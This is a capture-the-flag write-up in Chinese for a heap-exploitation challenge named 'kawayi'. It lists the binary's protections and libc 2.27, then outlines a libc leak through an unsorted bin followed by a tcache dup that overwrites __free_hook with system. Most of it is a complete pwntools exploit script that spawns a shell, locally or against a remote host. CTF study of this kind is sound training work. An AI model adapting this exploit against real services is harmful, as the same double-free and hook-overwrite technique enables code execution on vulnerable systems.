# kawayi 

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO |Full  |
|Canary|on    |
|NX    |on    |
|PIE   |on    |
|strip |no    |
|libc  |2.27-3ubuntu1.6|

## 解题思路

标准菜单题  
允许申请0x430大的unsorted bin，有double free和uaf，考虑通过释放unsorted bin拿到libc，
然后打tcache dup写free_hook为system，再释放`b'/bin/sh\0'`的chunk就可以拿shell

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'

def payload(lo:int):
    global sh
    if lo:
        sh = process('./kawayi')
        if lo & 2:
            gdb.attach(sh)
    else:
        context.proxy = (socks.SOCKS5, '127.0.0.1', 1080)
        sh = remote('192.168.16.186', 8888) 
    libc = ELF('./libc.so.6') 

    def addn(idx:int, size:int, cont:bytes, hooked:bool=False): 
        sh.sendlineafter(b'exit', b'1')
        sh.sendlineafter(b'index', str(idx).encode())
        sh.sendlineafter(b'size', str(size).encode())
        sh.sendafter(b'talk', cont)

    def edit(idx:int, cont:bytes):
        sh.sendlineafter(b'exit', b'3')
        sh.sendlineafter(b'index', str(idx).encode())
        sh.sendafter(b'write', cont)

    def deln(idx:int):
        sh.sendlineafter(b'exit', b'2')
        sh.sendlineafter(b'index', str(idx).encode())

    def show(idx:int) -> bytes:
        sh.sendlineafter(b'exit', b'4')
        sh.sendlineafter(b'index?\n\n', str(idx).encode())
        return sh.recvline()

    def eout():
        sh.sendlineafter(b'exit', b'5')

    addn(0, 0x410, b' ')
    addn(1, 0x20, b' ') # prevent chunk 0 being merged into top chunk
    deln(0)
    ret = show(0)

    dumpArena = libc.symbols['__malloc_hook'] + (libc.symbols['__malloc_hook'] - libc.symbols['__realloc_hook']) * 2
    mainArena = u64(ret[:6] + b'\0\0') - 0x60 # sub unsorted bin offset
    libcBase = mainArena - dumpArena
    success(GOLD_TEXT(f'Leak libc: {hex(libcBase)}'))
    freeHook = libcBase + libc.symbols['__free_hook']
    system = libcBase + libc.symbols['system']

    # tcache dup
    deln(1)
    edit(1, p64(freeHook) + p64(0))
    deln(1)
    edit(1, p64(freeHook) + p64(0))
    addn(2, 0x20, p64(system))
    addn(3, 0x20, p64(system))
    # get shell
    edit(1, b'/bin/sh\0')
    deln(1)

    sh.clean()
    sh.interactive()
```

> 最后一分钟交的flag，真是蓟县
